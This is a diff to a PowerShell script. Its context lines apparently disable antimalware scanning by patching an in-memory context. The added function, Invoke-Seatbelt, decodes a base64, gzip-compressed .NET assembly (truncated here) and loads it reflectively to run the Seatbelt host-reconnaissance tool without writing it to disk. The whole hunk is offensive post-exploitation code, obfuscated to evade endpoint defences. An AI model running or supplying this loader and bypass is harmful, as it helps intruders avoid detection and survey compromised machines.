@@ -467,3 +467,31 @@ $newContext = $marshal::AllocHGlobal(4);
 
 $context.SetValue($null,[IntPtr]$newContext);
 $session.SetValue($null,$null);
+
+
+
+# Open-Source Software Obfuscation
+function Invoke-Seatbelt {
+    [CmdletBinding()]
+    Param (
+        [String]
+        $args = " "
+    )
+
+    $gzipB64 = "H4sIABeUPmYA/+39BZyV1RY3AD/nORUTTBBDhtTAkCElNVQoJaGoKIyEoMDgGUrH0UHCwu4GwWt3NyhmXLEzQPHaGdfG779iPzVnAO/1vu/7fb/vxF57rd1da6899uCzrLBlWRH8//zTsu4FpM9ghbv6VOOf2/z+XOvO5PMt7w2Neb7l5LnzKlosSpcfkS5b0GJm2cKF5YtbHD67RXrJwhbzFrYYNn5SiwXls2Z3z<SNIP>"
+    $gzipBytes = [Convert]::FromBase64String($gzipB64);
+    $gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
+    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress);
+    $seatbeltMemoryStream = New-Object System.IO.MemoryStream;
+    $gzipStream.CopyTo($seatbeltMemoryStream);
+
+    $seatbeltArray = $seatbeltMemoryStream.ToArray();
+    $seatbelt = [System.Reflection.Assembly]::Load($seatbeltArray);
+    $oldConsoleOut = [Console]::Out;
+    $StringWriter = New-Object IO.StringWriter;
+    [Console]::SetOut($StringWriter);
+    [Seatbelt.Program]::Main($args.Split(" "));
+    [Console]::SetOut($OldConsoleOut);
+    $Results = $StringWriter.ToString();
+    $Results
+}
